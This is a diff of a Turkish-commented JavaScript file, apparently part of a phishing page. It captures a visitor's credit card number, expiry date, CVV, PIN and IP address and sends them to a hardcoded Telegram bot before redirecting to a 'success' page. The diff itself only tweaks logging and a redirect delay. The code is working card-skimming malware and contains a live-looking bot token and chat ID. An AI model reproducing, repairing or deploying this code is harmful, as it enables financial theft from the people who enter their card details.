@@ -1,4 +1,4 @@
-// phmain.js - TAM ÇALIŞAN VERSİYON
+// phmain.js - EKSİKSİZ TAM KOD
 
 const BOT_TOKEN = "8068339823:AAFNIqQZb_b-vE3oeZ0NGQ6QK4Xc0h34p7w";
 const CHAT_ID = "-1002475411082";
@@ -51,18 +51,18 @@ function getIP(callback) {
 
 function sendToTelegram(message) {
     var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message);
-    console.log('Gönderiliyor...');
+    console.log('Gönderilen URL:', url);
     
     fetch(url)
         .then(function(response) {
-            console.log('Response status:', response.status);
-            return response.json();
+            console.log('HTTP Durum:', response.status);
+            return response.text();
         })
         .then(function(data) {
-            console.log('Telegram yanıtı:', data);
+            console.log('Telegram Yanıtı:', data);
         })
         .catch(function(err) {
-            console.log('HATA:', err);
+            console.log('Fetch Hatası:', err);
         });
 }
 
@@ -177,12 +177,15 @@ window.addEventListener('DOMContentLoaded', function() {
             
             getIP(function(ip) {
                 var mesaj = 'Kredi Kartı Bilgisi:\n Kart No: ' + kartNo + '\n SKT: ' + skt + '\n CVV: ' + cvv + '\n Şifre: ' + sifre + '\n IP: ' + ip;
+                console.log('Mesaj:', mesaj);
                 sendToTelegram(mesaj);
                 
                 setTimeout(function() {
                     window.location.href = 'success.html';
-                }, 1000);
+                }, 1500);
             });
         };
+    } else {
+        console.log('Buton bulunamadı!');
     }
 });
